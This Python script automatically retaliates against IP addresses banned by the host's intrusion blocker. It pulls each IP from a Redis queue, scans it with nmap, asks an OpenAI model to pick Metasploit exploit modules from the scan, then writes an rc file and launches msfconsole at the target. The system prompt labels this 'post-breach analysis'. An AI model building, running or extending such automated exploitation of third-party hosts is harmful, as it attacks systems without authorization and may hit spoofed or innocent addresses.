#!/usr/bin/env python3

import redis
import subprocess
import time
import tempfile
import requests
import os
import re
from datetime import datetime


class AiError(Exception):
    pass


class OpenAIProvider:
    def __init__(self) -> None:
        self.api_key: str = os.environ.get("OPENAI_API_KEY")
        if not self.api_key:
            raise ValueError("OPENAI_API_KEY is not set in the environment.")
        self.endpoint: str = "https://api.openai.com/v1/chat/completions"
        self.model: str = "gpt-4o-mini"

    def improve_text(self, prompt: str, text: str) -> str:
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json",
        }

        body = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": prompt},
                {"role": "user", "content": text},
            ],
            "temperature": 0.4,
        }

        response = requests.post(self.endpoint, json=body, headers=headers, timeout=120)
        if response.status_code == 200:
            return response.json()["choices"][0]["message"]["content"].strip()

        raise AiError(
            f"OpenAI API call failed: {response.status_code} - {response.text}"
        )


# CONFIG
REDIS_QUEUE = "banned_ips"
SCAN_TIMEOUT = 600
PRECHECK_TIMEOUT = 30
MIN_EXPECTED_OUTPUT_BYTES = 500
TMP_OUTPUT = "/tmp/nmap_result.txt"
FASTSCAN_FILE = "/tmp/nmap_fastscan.txt"
EXPLOITS_FILE = "/opt/fail2counter/exploits.txt"


def log(msg, level="INFO"):
    print(f"[{datetime.utcnow().isoformat()}] [{level}] {msg}")

def write_msf_rc(ip: str, modules: list[str]) -> str:
    rc_path = f"/tmp/ip-{ip}.rc"
    with open(rc_path, "w") as f:
        for mod in modules:
            f.write(f"use {mod}\n")
            f.write(f"set RHOSTS {ip}\n")
            f.write("set RPORT 80\n")  # You can adjust this dynamically later
            f.write("run\n\n")
    return rc_path

def run_msf(ip: str, rc_file: str) -> str:
    output_path = f"/tmp/ip-{ip}.msfout"
    try:
        subprocess.run(
            ["msfconsole", "-q", "-r", rc_file],
            stdout=open(output_path, "w"),
            stderr=subprocess.STDOUT,
            timeout=300
        )
        with open(output_path) as f:
            return f.read()
    except subprocess.TimeoutExpired:
        return "[TIMEOUT] Metasploit run exceeded 5 minutes"
    except Exception as e:
        return f"[ERROR] Metasploit execution failed: {e}"


# Load exploit list
log(f"Loading Metasploit module list from {EXPLOITS_FILE}")
if not os.path.exists(EXPLOITS_FILE):
    log(f"Exploit list not found: {EXPLOITS_FILE}", level="ERROR")
    exit(1)

with open(EXPLOITS_FILE, "r") as f:
    exploits_list = f.read()

log(f"Loaded {len(exploits_list.splitlines())} Metasploit modules.")

system_prompt = f"""You are a cybersecurity expert helping choose Metasploit modules for post-breach analysis.

Below is a list of available Metasploit modules:

{exploits_list}

You will be given Nmap results for a scanned IP address. Using the list above, suggest which modules are likely applicable.
Only return a valid metasploit rc file for each module identified from the list, no explanations.

e.g: 

use exploit/linux/ssh/ceragon_fibeair_known_privkey
set RHOSTS 192.0.2.1
set RPORT 22
run

"""

REDIS_PASSWORD = os.environ.get("REDIS_PASSWORD")
if not REDIS_PASSWORD:
    log("REDIS_PASSWORD environment variable is not set", level="ERROR")
    exit(2)

try:
    r = redis.Redis(host="localhost", port=6379, db=0, password=REDIS_PASSWORD)
    r.ping()
    log("Connected to Redis successfully.")
except Exception as e:
    log(f"Failed to connect to Redis: {e}", level="ERROR")
    exit(3)

provider = OpenAIProvider()

while True:
    try:
        ip_entry = r.lpop(REDIS_QUEUE)
    except Exception as e:
        log(f"Redis error while reading queue: {e}", level="ERROR")
        time.sleep(10)
        continue

    if not ip_entry:
        log("Queue empty, sleeping 10s...")
        time.sleep(10)
        continue

    try:
        timestamp, ip = ip_entry.decode().split("|")
        log(f"Dequeued IP: {ip} (banned at {timestamp})")
    except Exception as e:
        log(f"Failed to parse Redis queue entry: {ip_entry} — {e}", level="ERROR")
        continue

    # Precheck
    precheck_file = "/tmp/nmap_precheck.txt"
    log(f"Running precheck for {ip}")
    try:
        subprocess.run(
            ["timeout", str(PRECHECK_TIMEOUT), "nmap", "-sn", ip],
            check=True,
            stdout=open(precheck_file, "w"),
            stderr=subprocess.DEVNULL,
        )
        with open(precheck_file) as f:
            lines = f.read()
            log(lines, "INFO")
            if "Host seems down" in lines:
                log(f"[SKIP] Host {ip} seems down")
                continue
    except subprocess.CalledProcessError:
        log(f"[SKIP] Precheck failed or timed out for {ip}", level="WARNING")
        continue

    # Fast scan
    log(f"Running fast port scan on {ip}")
    try:
        subprocess.run(
            ["timeout", str(SCAN_TIMEOUT), "nmap", "-T4", "-F", "-oG", FASTSCAN_FILE, "-v", ip],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        with open(FASTSCAN_FILE) as f:
            lines = f.read()
            log(lines, "INFO")
            grepable = lines
        matches = re.findall(r"(\d+)/open", grepable)
        log(matches, "DEBUG")
        ports = ",".join(matches)
        if not ports:
            log(f"No open ports found on {ip}", level="WARNING")
            continue
        log(f"Open ports: {ports}")
    except Exception as e:
        log(f"Fast scan failed: {e}", level="ERROR")
        continue

    # Version scan
    log(f"Running service version detection for {ip}")
    try:
        with open(TMP_OUTPUT, "w") as out:
            subprocess.run(
                [
                    "timeout", str(SCAN_TIMEOUT),
                    "nmap", "-sV", "--version-light",
                    "--max-retries", "1",
                    "--min-parallelism", "10",
                    "--host-timeout", "60s",
                    "-p", ports,
                    "-T4", "-v", ip
                ],
                check=True,
                stdout=out,
                stderr=out,
            )
        log(f"Scan completed for {ip}")
    except subprocess.CalledProcessError:
        log(f"Nmap scan failed or timed out for {ip}", level="WARNING")

    try:
        with open(TMP_OUTPUT) as f:
            nmap_output = f.read()
            log(nmap_output, "DEBUG")
        if len(nmap_output) < MIN_EXPECTED_OUTPUT_BYTES:
            log(f"Skipping {ip} due to small output", level="WARNING")
            continue
        log(f"Nmap output size: {len(nmap_output)} bytes")
    except Exception as e:
        log(f"Failed to read Nmap output: {e}", level="ERROR")
        continue

    try:
        log(f"Sending to OpenAI for analysis...")
        result = provider.improve_text(system_prompt, f"Nmap output:\n{nmap_output}")
        log(f"OpenAI response:\n{result}")

        modules = [line.strip() for line in result.strip().splitlines() if line.strip().startswith("exploit/")]
        if not modules:
            log(f"No valid Metasploit modules returned for {ip}", level="WARNING")
            continue

        rc_path = write_msf_rc(ip, modules)
        log(f"Written Metasploit RC file to {rc_path}")

        msf_result = run_msf(ip, rc_path)
        log(f"Metasploit output for {ip}:\n{msf_result}")

    except Exception as e:
        log(f"OpenAI or Metasploit processing failed for {ip}: {e}", level="ERROR")